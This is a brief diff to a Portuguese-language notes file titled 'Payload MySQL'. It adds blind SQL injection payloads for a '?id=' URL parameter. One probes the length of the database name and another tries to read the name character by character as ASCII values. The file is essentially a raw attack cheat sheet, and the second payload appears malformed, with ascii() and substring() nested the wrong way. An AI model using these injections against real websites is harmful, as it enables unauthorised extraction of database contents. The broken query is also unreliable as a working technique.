@@ -1,5 +1,7 @@
 ==============Payload MySQL==========
 
-extraindo características da database.
-
+EXTRAINDO número de caracteres DA DATABASE.
   ?id=1' AND LENGTH(DATABASE()) > 2 --+
+  
+  EXTRAINDO OS CARACTERES DO BANCO DE DADOS EM ASCII.
+  ?id=1' AND substring(ascii(DATABASE()),1,8) >= 115--+-
